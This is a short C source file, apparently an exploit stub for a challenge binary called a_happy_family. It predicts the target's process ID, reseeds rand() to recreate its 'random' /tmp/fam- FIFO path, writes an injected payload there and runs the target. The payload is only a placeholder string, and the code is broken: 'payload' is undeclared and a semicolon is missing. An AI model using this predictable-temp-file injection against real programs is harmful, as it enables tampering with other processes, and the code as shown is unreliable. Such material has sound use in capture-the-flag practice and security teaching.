
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define CHARS 62

char *p;
int num;

FILE *fif;
char fifpath[64] = "/tmp/fam-";
	
char randchars[CHARS + 1] =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

void openfif(char *mode) {
    fif = fopen(fifpath, mode);
    setvbuf(fif, NULL, _IONBF, 0);
}

void closefif() {
    fclose(fif);
    fif = NULL;
}

int main(int argc, char *argv[]){

	int conv = getpid() + 2; // assume consecutive process creations

	srand(conv);
	for (int i = 9; i < 20; i++) {
		fifpath[i] = randchars[rand() % CHARS];
	}

	fifpath[20] = 0;

	payload = "insert eyzenberg magic" // insert eyzenberg magic here
	
	openfif("w");
	fprintf(fif, "%s\n", payload);
	closefif();
	
	system("./a_happy_family");

}
